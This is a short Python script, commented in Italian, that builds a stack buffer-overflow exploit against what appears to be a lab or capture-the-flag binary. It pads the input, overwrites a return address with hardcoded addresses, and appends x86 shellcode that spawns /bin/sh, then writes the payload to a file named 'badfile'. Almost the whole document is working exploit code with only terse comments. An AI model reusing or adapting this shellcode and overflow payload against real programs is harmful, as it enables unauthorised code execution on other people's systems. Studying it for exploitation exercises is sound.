

import os
import struct

#exploitare vuln per eseguire la shell

string = 0x0804a060
vuln = 0x804849b

#shellcode solito
shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

#bisogna sfruttare la strcpy da string a buf
#bisogna superare la prima gets
payload = "A\n"

#poi bisogna aggiungere
#pero` c'e` da seguire lo schema della condizione
#payload1 = "a"*10
#payload1 += "b"
#payload1 += "c"
#possono essere sostituiti da:
payload1 = "AAAAAAAAAabc"
payload1 += "D"*(148 - len(payload1))
#metto dentro l'indirizzo della stringa
payload1 += struct.pack("I", string)

payload1 += "F"*8
payload1 += struct.pack("I", vuln)

#payload1 += "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH"
#subito dopo c'e` il ret

#quindi faccio padding: parto dall'indirizzo della stringa, aggiungo il payload, e poi 4 per scavalcare
padding = string + len(payload1) + 4
payload1 += struct.pack("I", padding)
payload1 += shellcode

payload += payload1

f = open("badfile", "w")
f.write("%s" % payload)
f.close()
